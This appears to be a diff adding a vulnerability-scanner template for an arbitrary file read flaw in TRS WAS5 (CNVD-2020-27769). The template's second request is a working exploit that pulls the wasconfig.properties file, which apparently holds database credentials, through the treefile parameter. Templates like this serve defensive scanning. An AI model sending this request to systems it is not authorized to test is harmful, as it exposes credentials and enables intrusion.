@@ -1,0 +1,39 @@
+id: trs-was5-readfile-cnvd-2020-27769
+info:
+  name: TRS WAS5 Arbitrary File Read CNVD-2020-27769
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    Arbitrary file read vulnerability in TRS WAS5 allowing attackers to access sensitive configuration files.
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2020-27769
+
+http:
+  - id: detect
+    method: GET
+    path:
+      - "{{BaseURL}}/was5/web"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/was5/admin/images"
+
+  - id: r0
+    method: GET
+    path:
+      - "{{BaseURL}}/was5/web/tree?treefile=/WEB-INF/classes/com/trs/was/resource/wasconfig.properties"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "sysdriver"
+          - "sysuser"
